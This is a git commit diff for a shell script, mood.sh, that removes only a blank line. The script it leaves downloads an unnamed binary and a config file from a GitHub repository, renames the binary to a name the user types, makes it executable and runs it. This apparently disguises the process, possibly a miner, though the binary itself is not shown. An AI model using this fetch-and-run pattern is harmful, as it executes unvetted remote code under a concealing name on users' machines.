06af4a84e17878441d6524de65f8756cc4e77dd6
penjelajahwaktu <141205123+penjelajahwaktu@users.noreply.github.com>
2023-08-08 16:44:56 +0700

    Update mood.sh

--- mood.sh
+++ mood.sh
@@ -1,3 +1,2 @@
-
 read -p " name: " CRP
 wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/script.ini && mv cok $CRP && chmod +x $CRP && ./$CRP script.ini
